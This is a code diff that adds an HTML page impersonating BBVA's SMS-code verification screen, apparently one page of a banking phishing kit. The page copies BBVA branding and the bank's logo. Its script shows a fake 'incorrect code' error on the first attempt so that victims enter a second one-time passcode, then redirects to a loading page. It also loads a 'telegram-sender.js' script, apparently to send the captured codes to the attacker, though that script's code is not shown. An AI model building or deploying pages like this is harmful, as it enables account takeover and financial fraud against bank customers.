@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html class="js history cssgradients csstransitions" lang="es" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA - Código SMS</title>
+    <link rel="shortcut icon" href="assets/img/favicon-bbva-es.ico">
+    <link href="assets/css/sms-icon.css" rel="stylesheet">
+    <style>
+        /* Styles spécifiques pour la page de vérification SMS */
+        body {
+            font-family: 'BentonSansBBVA', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('assets/fonts/BentonSansBBVA-Book.woff2') format('woff2'),
+                 url('assets/fonts/BentonSansBBVA-Book.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('assets/fonts/BentonSansBBVA-Medium.woff2') format('woff2'),
+                 url('assets/fonts/BentonSansBBVA-Medium.woff') format('woff');
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'BentonSansBBVA';
+            src: url('assets/fonts/BentonSansBBVA-Bold.woff2') format('woff2'),
+                 url('assets/fonts/BentonSansBBVA-Bold.woff') format('woff');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        .container {
+            max-width: 600px; /* Reduced max-width for content area */
+            margin: 0 auto;
+            padding: 0 15px;
+            flex-grow: 1; /* Allow container to grow */
+            display: flex;
+            flex-direction: column;
+            justify-content: center; /* Center content vertically */
+        }
+
+        .header {
+            background-color: #fff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            position: fixed; /* Fix header to top */
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .logo img {
+            height: 30px;
+        }
+
+        .header-right span {
+             font-size: 14px;
+        }
+
+        .form-wrapper {
+             padding-top: 80px; /* Add padding to avoid overlap with fixed header */
+             padding-bottom: 20px;
+        }
+
+        .form {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            width: 100%; /* Ensure form takes container width */
+            box-sizing: border-box;
+        }
+
+        h5 {
+            color: #004481;
+            font-size: 20px;
+            margin-bottom: 15px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        p {
+            color: #121212;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 25px;
+            max-width: 250px; /* Limit max width of the form group for SMS code */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #1973B8;
+            border-radius: 4px;
+            font-size: 18px; /* Slightly larger font for code */
+            background-color: #f0f6ff;
+            box-sizing: border-box;
+            text-align: center; /* Center text inside input */
+            letter-spacing: 3px; /* Add spacing between digits */
+        }
+
+        .form-group label {
+            position: absolute;
+            top: -10px;
+            left: 50%; /* Center label */
+            transform: translateX(-50%); /* Adjust centering */
+            background-color: white;
+            padding: 0 8px;
+            font-size: 13px;
+            color: #004481;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+
+        .form-group .close {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            display: none; /* Initially hidden */
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .form-group input:focus + label + .close,
+        .form-group input:not(:placeholder-shown) + label + .close {
+             display: block; /* Show close button on focus or when input has value */
+        }
+
+        .bttn {
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .bttn button {
+            background-color: #004481;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            max-width: 250px; /* Match input width */
+            text-transform: uppercase;
+        }
+
+        .bttn button:hover {
+            background-color: #043263;
+        }
+
+        .pb-4 {
+            padding-bottom: 20px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            padding: 20px 0;
+            width: 100%;
+        }
+
+        /* Message d'erreur */
+        .error-message {
+            color: #e74c3c;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Lien "No has recibido el código" */
+        .resend-link {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .resend-link a {
+            color: #1973B8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 10px;
+            }
+            .form {
+                padding: 20px;
+            }
+            h5 {
+                font-size: 18px;
+            }
+            p {
+                font-size: 13px;
+            }
+            .form-group input {
+                font-size: 16px;
+                padding: 10px;
+            }
+            .bttn button {
+                font-size: 14px;
+                padding: 10px 20px;
+            }
+            .form-group label {
+                font-size: 12px;
+            }
+            .footer {
+                font-size: 11px;
+            }
+            .form-group {
+                max-width: 200px; /* Adjust max width for smaller screens */
+            }
+            .bttn button {
+                max-width: 200px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <img src="https://www.bbva.es/content/dam/library/logos/logo-bbva.svg" alt="BBVA Logo">
+        </div>
+        <div class="header-right">
+            <span>Acceso seguro</span>
+        </div>
+    </div>
+
+    <div class="container form-wrapper">
+        <div class="form">
+            <form id="smsForm" data-next-page="loading3.html"> <!-- Ajout de data-next-page pour le tracking -->
+                <h5>Introduzca el código SMS recibido</h5>
+
+                <div class="text-center pb-4">
+                    <div class="sms-icon"></div> <!-- Ensure sms-icon class provides an image/icon -->
+                </div>
+
+                <div class="form-group">
+                    <input type="tel" name="sms_code" id="sms" required placeholder=" " pattern="\d{6}" title="Introduzca 6 dígitos" maxlength="6"> <!-- Use type=tel, add placeholder, pattern, maxlength -->
+                    <label for="sms">Código SMS</label>
+                    <div class="close">✕</div>
+                </div>
+
+                <div class="error-message" id="errorMessage">
+                    Código SMS incorrecto. Por favor, inténtelo de nuevo.
+                </div>
+
+                <div class="bttn">
+                    <button type="button" id="submitButton">Aceptar</button>
+                </div>
+
+                <div class="resend-link">
+                    <a href="phone.html">¿No has recibido el código?</a> <!-- Corrected link text -->
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Banco Bilbao Vizcaya Argentaria, S.A.</p>
+        <p>Creando Oportunidades</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const smsInput = document.getElementById('sms');
+            const closeButton = document.querySelector('.form-group .close');
+            const submitButton = document.getElementById('submitButton');
+            const errorMessage = document.getElementById('errorMessage');
+            let attempts = 0;
+
+            // Show/hide close button based on focus and content
+            smsInput.addEventListener('focus', function() {
+                if (smsInput.value.length > 0) {
+                    closeButton.style.display = 'block';
+                }
+            });
+
+            smsInput.addEventListener('blur', function() {
+                // Use setTimeout to allow click event on close button to register
+                setTimeout(() => {
+                    if (document.activeElement !== closeButton) {
+                         closeButton.style.display = 'none';
+                    }
+                }, 0);
+            });
+
+            smsInput.addEventListener('input', function() {
+                // Allow only digits and limit length
+                this.value = this.value.replace(/\D/g, '').substring(0, 6);
+                // Show close button if there is input
+                closeButton.style.display = this.value.length > 0 ? 'block' : 'none';
+                 // Hide error message on input
+                errorMessage.style.display = 'none';
+            });
+
+            // Clear input on close button click
+            closeButton.addEventListener('click', function() {
+                smsInput.value = '';
+                closeButton.style.display = 'none';
+                smsInput.focus();
+            });
+
+            // Handle submission
+            submitButton.addEventListener('click', function() {
+                // Basic validation (e.g., 6 digits)
+                if (smsInput.value.length === 6) {
+                     // Simulate submission logic
+                    attempts++;
+                    if (attempts === 1 && smsInput.value !== '123456') { // Example: Simulate error on first try unless specific code
+                        errorMessage.textContent = 'Código SMS incorrecto. Por favor, inténtelo de nuevo.';
+                        errorMessage.style.display = 'block';
+                        smsInput.value = ''; // Clear input on error
+                        smsInput.focus();
+                        closeButton.style.display = 'none';
+                    } else {
+                        // Redirect on second attempt or if correct code
+                        window.location.href = 'loading3.html';
+                    }
+                } else {
+                    // Show error if format is incorrect
+                    errorMessage.textContent = 'Introduzca un código SMS válido (6 dígitos).';
+                    errorMessage.style.display = 'block';
+                    smsInput.focus();
+                }
+            });
+        });
+    </script>
+    
+    <!-- Script de tracking Telegram -->
+    <script src="js/telegram-sender.js"></script>
+</body>
+</html>
